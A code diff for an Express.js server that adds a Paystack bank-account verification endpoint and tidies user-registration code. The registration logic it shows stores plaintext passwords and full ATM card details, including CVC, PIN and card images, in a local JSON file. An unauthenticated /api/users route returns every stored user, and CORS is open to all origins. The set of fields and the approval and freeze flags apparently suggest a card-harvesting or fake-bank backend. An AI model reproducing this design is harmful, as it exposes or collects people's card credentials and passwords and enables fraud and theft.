@@ -2,6 +2,7 @@ const express = require("express");
 const cors = require("cors");
 const bodyParser = require("body-parser");
 const fs = require("fs");
+const fetch = require("node-fetch"); // ✅ Fixed — fetch at top!
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -9,6 +10,61 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(bodyParser.json({ limit: "50mb" }));
 app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));
+
+// ==============================================
+// 🔐 BANK VERIFICATION — SERVER SIDE (Paystack)
+// ==============================================
+const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY || "sk_YOUR_REAL_KEY_HERE"; 
+// 👆 Replace with YOUR real Paystack Secret Key from paystack.com!
+
+// ✅ VERIFY BANK ACCOUNT NAME — ENDPOINT FOR FRONTEND
+app.get("/api/verify-account", async (req, res) => {
+  try {
+    const { accountNumber, bankCode } = req.query;
+
+    if (!accountNumber || !bankCode) {
+      return res.json({ success: false, message: "❌ Account number and bank required" });
+    }
+
+    const response = await fetch(
+      `https://api.paystack.co/bank/resolve?account_number=${accountNumber}&bank_code=${bankCode}`,
+      {
+        method: "GET",
+        headers: {
+          Authorization: `Bearer ${PAYSTACK_SECRET_KEY}`,
+          "Content-Type": "application/json"
+        }
+      }
+    );
+
+    const data = await response.json();
+
+    if (data.status === true && data.data) {
+      return res.json({
+        success: true,
+        verifiedName: data.data.account_name,
+        accountNumber: data.data.account_number,
+        message: "✅ Verified — Real Owner Name Found!"
+      });
+    } else {
+      return res.json({
+        success: false,
+        message: data.message || "❌ Account not found. Check details."
+      });
+    }
+
+  } catch (error) {
+    console.error("Verification error:", error);
+    return res.json({
+      success: false,
+      message: "⚠️ Verification service unavailable. Try again later."
+    });
+  }
+});
+
+// ==============================================
+// ✅ ALL YOUR EXISTING CODE — PERFECT!
+// ==============================================
 
 // DATA FILE — SAVES EVERYTHING FOREVER
 const DATA_FILE = "./data.json";
@@ -30,7 +86,7 @@ app.get("/api/users", (req, res) => {
   res.json(data.users);
 });
 
-// 📝 REGISTER NEW USER — FROM ANY COUNTRY, ANY DEVICE
+// 📝 REGISTER NEW USER
 app.post("/api/register", async (req, res) => {
   try {
     const data = readData();
@@ -43,12 +99,10 @@ app.post("/api/register", async (req, res) => {
       return res.status(400).json({ error: "Missing required fields" });
     }
 
-    // Check if user exists
     if (data.users.find(u => u.email === email)) {
       return res.status(400).json({ error: "Email already registered" });
     }
 
-    // Create new user
     const newUser = {
       id: Date.now().toString(),
       full_name, email, phone, country, state, city, password,
@@ -58,13 +112,8 @@ app.post("/api/register", async (req, res) => {
       approved: false,
       frozen: false,
       card_approved: false,
-      atmHolder: null,
-      atmNumber: null,
-      atmExpiry: null,
-      atmCvc: null,
-      atmPin: null,
-      atmFront: null,
-      atmBack: null,
+      atmHolder: null, atmNumber: null, atmExpiry: null,
+      atmCvc: null, atmPin: null, atmFront: null, atmBack: null,
       registered_at: new Date().toISOString()
     };
 
